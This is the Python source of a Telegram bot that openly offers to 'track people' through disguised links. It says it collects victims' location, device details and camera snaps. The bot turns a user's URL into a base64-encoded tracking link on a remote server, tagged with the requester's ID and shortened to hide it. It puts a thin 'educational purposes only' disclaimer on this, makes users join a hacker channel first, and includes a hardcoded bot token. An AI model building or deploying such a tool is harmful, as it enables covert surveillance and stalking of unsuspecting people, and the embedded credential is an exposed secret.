import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import urllib.parse
import urllib.request
import base64
from flask import Flask
from threading import Thread

TOKEN = '8840717306:AAFnJ695LhZEm8kZOPdMyxHHE2EOselmxec'
CHANNEL_USERNAME = '@DARKHACKER1230'
SERVER_URL = "https://online-notes-hub.onrender.com"

CUSTOM_MESSAGE = """WELCOME 黑暗黑客 !
YOU CAN USE THIS BOT 🤖 TO TRACK PEOPLE JUST THROUGH A SIMPLE LINK 🔗.
IT CAN GATHER INFORMATIONS LIKE LOCATION 📍, DEVICE INFO 📱, CAMERA SNAPS 📷.

JOIN OUR CHANNELS TO USE THIS BOT 🤖. AFTER JOINING CHANNELS CLICK ON JOINED BUTTON TO CONTINUE."""

TERMS_MESSAGE = """✅TERMS AND CONDITIONS✅
1. THE DARK HACKER 1230 BOT IS INTENDED FOR EDUCATIONAL PURPOSES ONLY.
2. USERS ARE SOLELY RESPONSIBLE FOR THEIR OWN ACTIONS.
3. IF YOU USE THIS BOT FOR ILLEGAL ACTIVITIES, YOU DO SO AT YOUR OWN RISK.

IF YOU ARE AGREE WITH OUR TERMS , CLICK ON BUTTON BELOW."""

SUCCESS_MESSAGE = """THANK YOU 🙏 FOR ACCEPTING OUR TERMS AND CONDITIONS.
TO CREATE A NEW LINK, CLICK THE "CREATE LINK" BUTTON BELOW."""

bot = telebot.TeleBot(TOKEN)
user_state = {}

def create_short_code(long_url):
    try:
        api_url = f"{SERVER_URL}/shorten?url={urllib.parse.quote(long_url)}"
        req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as response:
            short_code = response.read().decode('utf-8').strip()
            return f"{SERVER_URL}/s/{short_code}"
    except:
        return long_url

@bot.message_handler(commands=['start'])
def send_welcome(message):
    try:
        bot.get_chat_member(CHANNEL_USERNAME, message.from_user.id)
        ask_to_join(message.chat.id)
    except:
        ask_to_join(message.chat.id)

def ask_to_join(chat_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("JOIN CHANNEL ↗", url=f"https://t.me/{CHANNEL_USERNAME.replace('@','')}"))
    markup.add(InlineKeyboardButton("JOINED ✅", callback_data="check_join"))
    bot.send_message(chat_id, CUSTOM_MESSAGE, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_query(call):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, call.from_user.id)
        if member.status in ['member', 'administrator', 'creator']:
            bot.answer_callback_query(call.id, "Successfully joined! ✅")
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("ACCEPT TERMS ✅", callback_data="accept_terms"))
            bot.send_message(call.message.chat.id, TERMS_MESSAGE, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "Join channel first!", show_alert=True)
    except:
        bot.answer_callback_query(call.id, "Please join channel first!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "accept_terms")
def accept_terms_query(call):
    bot.answer_callback_query(call.id, "Terms Accepted ✅")
    send_create_link_menu(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "create_new_link")
def create_new_link_query(call):
    bot.answer_callback_query(call.id, "Send your URL")
    bot.send_message(call.message.chat.id, "🌐 Enter Your URL:")
    user_state[call.from_user.id] = "waiting_for_link"

def send_create_link_menu(chat_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("CREATE LINK 🔗", callback_data="create_new_link"))
    bot.send_message(chat_id, SUCCESS_MESSAGE, reply_markup=markup)

@bot.message_handler(func=lambda message: user_state.get(message.from_user.id) == "waiting_for_link")
def handle_user_link(message):
    user_link = message.text.strip()
    creator_id = message.from_user.id
    user_state[message.from_user.id] = None
    
    try:
        encoded = base64.b64encode(user_link.encode('utf-8')).decode('utf-8')
        tracking_url = f"{SERVER_URL}/go/{encoded}/{creator_id}"
        short_link = create_short_code(tracking_url)
        
        bot.send_message(message.chat.id, 
            f"✅ LINK CREATED!\nURL: {user_link}\n\n🔗 YOUR SHORT LINK:\n{short_link}\n\nDEV - DarkHacker1230 🕷",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("CREATE NEW LINK 🔗", callback_data="create_new_link")))
    except Exception as e:
        bot.send_message(message.chat.id, "❌ Invalid URL! Try again.")

@bot.message_handler(commands=['help', 'create'])
def help_or_create(message):
    if message.text == '/create':
        user_state[message.from_user.id] = "waiting_for_link"
        bot.reply_to(message, "🔗 Send the URL you want to use:")
    else:
        bot.reply_to(message, "Send /create to begin.\n\nOWNER - @darkhacker1230")

# Flask keep-alive
app = Flask('')
@app.route('/')
def home():
    return "I am alive!"
Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()

print("Bot started! ✅")
bot.infinity_polling()
